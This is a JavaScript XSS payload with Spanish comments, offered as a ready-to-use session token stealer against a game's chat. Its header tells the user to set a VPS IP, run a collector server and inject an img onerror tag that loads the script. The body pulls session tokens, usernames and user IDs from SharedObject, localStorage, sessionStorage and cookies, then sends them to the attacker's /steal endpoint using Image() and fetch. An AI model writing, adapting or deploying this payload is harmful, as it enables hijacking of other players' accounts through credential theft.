/**
 * XSS Payload - Session Token Stealer
 *
 * INSTRUCCIONES:
 * 1. Reemplaza TU_VPS_IP con la IP de tu VPS
 * 2. Asegúrate de que session_stealer.py esté corriendo en puerto 5000
 * 3. Inyecta este payload en el chat del juego
 *
 * EJEMPLO DE INYECCIÓN:
 * <img src=x onerror='var s=document.createElement("script");s.src="http://TU_VPS_IP:8000/session_steal.js";document.body.appendChild(s);'>
 */

(function() {
    'use strict';

    const VPS_IP = 'TU_VPS_IP';  // ← CAMBIAR ESTO
    const COLLECTOR_PORT = 5000;

    try {
        console.log('[XSS] Iniciando robo de sesión...');

        // Intentar obtener token de SharedObject (Flash)
        var token = 'NO_TOKEN';
        var username = 'Unknown';
        var userId = 0;

        try {
            if (typeof SharedObject !== 'undefined') {
                var so = SharedObject.getLocal('userSession');
                if (so && so.data) {
                    token = so.data.sessionToken || so.data.token || 'NO_TOKEN';
                    username = so.data.username || so.data.user || 'Unknown';
                    userId = so.data.userId || so.data.uid || 0;
                }
            }
        } catch(e) {
            console.log('[XSS] SharedObject no disponible, intentando localStorage...');
        }

        // Fallback: Intentar localStorage
        if (token === 'NO_TOKEN') {
            try {
                token = localStorage.getItem('sessionToken') ||
                        localStorage.getItem('token') ||
                        sessionStorage.getItem('sessionToken') ||
                        'NO_TOKEN';

                username = localStorage.getItem('username') ||
                          localStorage.getItem('user') ||
                          'Unknown';

                userId = localStorage.getItem('userId') ||
                        localStorage.getItem('uid') ||
                        0;
            } catch(e) {
                console.log('[XSS] localStorage no disponible');
            }
        }

        // Fallback: Intentar cookies
        if (token === 'NO_TOKEN') {
            try {
                var cookies = document.cookie.split(';');
                for (var i = 0; i < cookies.length; i++) {
                    var cookie = cookies[i].trim();
                    if (cookie.startsWith('sessionToken=') || cookie.startsWith('token=')) {
                        token = cookie.split('=')[1];
                    }
                    if (cookie.startsWith('username=') || cookie.startsWith('user=')) {
                        username = cookie.split('=')[1];
                    }
                }
            } catch(e) {
                console.log('[XSS] Cookies no disponibles');
            }
        }

        // Enviar token robado al servidor collector
        var url = 'http://' + VPS_IP + ':' + COLLECTOR_PORT + '/steal' +
                  '?token=' + encodeURIComponent(token) +
                  '&user=' + encodeURIComponent(username) +
                  '&uid=' + userId;

        // Usar Image() para bypass CORS
        var img = new Image();
        img.onload = function() {
            console.log('[XSS] Token enviado exitosamente');
        };
        img.onerror = function() {
            console.log('[XSS] Error al enviar token (verifica que el servidor esté corriendo)');
        };
        img.src = url;

        // También intentar con fetch (si está disponible)
        if (typeof fetch !== 'undefined') {
            fetch(url, { mode: 'no-cors' })
                .then(() => console.log('[XSS] Token enviado vía fetch'))
                .catch(() => console.log('[XSS] Fetch falló, usando Image()'));
        }

        console.log('[XSS] Payload ejecutado. Token: ' + token.substring(0, 30) + '...');

    } catch(e) {
        console.error('[XSS] Error en payload:', e);
    }
})();
